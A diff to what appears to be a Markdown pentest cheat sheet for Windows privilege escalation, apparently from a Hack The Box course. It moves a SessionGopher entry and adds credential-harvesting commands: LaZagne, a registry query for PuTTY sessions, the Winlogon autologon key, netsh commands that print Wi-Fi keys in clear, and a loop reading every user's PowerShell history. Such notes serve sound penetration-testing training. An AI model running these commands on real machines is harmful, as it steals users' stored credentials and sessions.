@@ -63,10 +63,6 @@ SharpUp.exe audit
 Seatbelt.exe -group=all -full
 
 powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
-
-. .\SessionGopher.ps1(About
-SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.)
-Invoke-SessionGopher -Thorough
 ```
 ### RunAs
 Require GUI access
@@ -143,6 +139,25 @@ gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Di
 unattend.xml
 (Get-PSReadlineOption).HistorySavePath
 foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
+
+. .\SessionGopher.ps1(About
+SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.)
+Invoke-SessionGopher -Thorough
+
+.\lazagne.exe all
+```
+###### Windows Autologon
+```
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+```
+###### putty
+```
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+```
+###### WIFI passwords
+```
+netsh wlan show profile
+netsh wlan show profile ssid key=clear
 ```
 ###### Decrypt DPAPI Protected PSCredential
 ```
